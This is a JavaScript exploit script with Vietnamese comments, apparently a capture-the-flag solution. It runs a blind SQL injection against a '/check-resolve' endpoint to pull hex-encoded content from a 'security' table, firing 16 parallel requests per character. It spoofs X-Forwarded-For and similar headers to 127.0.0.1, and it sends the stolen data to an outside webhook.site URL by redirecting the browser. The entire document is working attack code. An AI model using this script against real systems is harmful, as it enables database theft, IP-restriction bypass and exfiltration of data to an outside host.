(async function() {
    let startTime = Date.now();
    let hexData = "";
    let chars = "0123456789ABCDEF".split('');

    // Quét nội dung cột 'content' trong bảng 'security' tại id = 6
    for (let pos = 1; pos <= 120; pos++) {
        // CƠ CHẾ BẢO VỆ: Chạy đến giây thứ 4 là phải ôm cờ bỏ chạy ngay!
        if (Date.now() - startTime > 4000) break; 

        // Bắn 16 request cùng lúc để hỏi xem ký tự Hex tại vị trí pos là gì
        let requests = chars.map(async (c) => {
            let fd = new URLSearchParams();
            // Lệnh SQL chốt hạ: Lấy content từ bảng security
            fd.append('id', `6 AND substr(hex((SELECT content FROM security WHERE id=6)), ${pos}, 1) = '${c}'`);
            
            try {
                let r = await fetch('/check-resolve', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Forwarded-For': '127.0.0.1',
                        'X-Real-IP': '127.0.0.1',
                        'Client-IP': '127.0.0.1'
                    },
                    body: fd.toString()
                });
                let data = await r.text();
                // Nếu server trả về Not yet -> chữ cái đó đúng!
                if (data.includes('Not yet')) return c;
            } catch(e) {}
            return null;
        });

        // Chờ 16 request chạy xong và lọc ra ký tự đúng
        let results = await Promise.all(requests);
        let foundChar = results.find(c => c !== null);

        if (foundChar) {
            hexData += foundChar;
        } else {
            break; // Đã quét hết chuỗi cờ
        }
    }
    
    // Ép Bot mang chuỗi cờ (dạng Hex) tẩu thoát về Beeceptor
    window.location = 'https://webhook.site/2fc3e3e9-24dd-4048-91c9-b5cc45619d1d/?THE_FLAG_IS_HEX=' + hexData;
})();